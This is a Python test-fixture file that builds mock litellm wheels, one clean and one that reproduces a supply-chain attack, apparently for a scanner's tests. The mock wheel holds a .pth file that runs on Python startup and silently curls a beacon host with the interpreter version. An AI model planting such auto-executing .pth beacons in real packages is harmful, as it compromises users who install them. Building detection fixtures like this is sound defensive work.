"""
Test fixtures: create mock packages for testing.
"""

import zipfile
from pathlib import Path


def create_mock_litellm_attack(target_dir: Path) -> Path:
    """
    Create a mock litellm 1.82.7 wheel that simulates the actual attack.
    Uses the EXACT pattern from the real attack:
    - litellm_init.pth file with subprocess beacon call
    """
    target_dir.mkdir(parents=True, exist_ok=True)
    wheel_path = target_dir / "litellm-1.82.7-py3-none-any.whl"

    # .pth content matching the real attack pattern
    pth_content = (
        "import subprocess,sys;"
        "subprocess.Popen("
        "['curl','-s','https://models.litellm.cloud/beacon',"
        "'-d',sys.version],"
        "stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)"
    )

    with zipfile.ZipFile(wheel_path, "w") as zf:
        # Normal package files (same as clean version)
        zf.writestr("litellm/__init__.py", "# litellm AI proxy")
        zf.writestr("litellm/main.py", "def completion(*args, **kwargs): pass")
        zf.writestr("litellm-1.82.7.dist-info/METADATA", "Name: litellm\nVersion: 1.82.7\n")
        zf.writestr("litellm-1.82.7.dist-info/WHEEL", "Wheel-Version: 1.0\n")
        zf.writestr("litellm-1.82.7.dist-info/RECORD", "")

        # THE MALICIOUS FILE — .pth injection
        zf.writestr("litellm_init.pth", pth_content)

    return wheel_path


def create_clean_litellm(target_dir: Path, version: str = "1.82.6") -> Path:
    """Create a clean litellm wheel (no malicious files)."""
    target_dir.mkdir(parents=True, exist_ok=True)
    wheel_path = target_dir / f"litellm-{version}-py3-none-any.whl"

    with zipfile.ZipFile(wheel_path, "w") as zf:
        zf.writestr("litellm/__init__.py", "# litellm AI proxy")
        zf.writestr("litellm/main.py", "def completion(*args, **kwargs): pass")
        zf.writestr(f"litellm-{version}.dist-info/METADATA", f"Name: litellm\nVersion: {version}\n")
        zf.writestr(f"litellm-{version}.dist-info/WHEEL", "Wheel-Version: 1.0\n")
        zf.writestr(f"litellm-{version}.dist-info/RECORD", "")

    return wheel_path
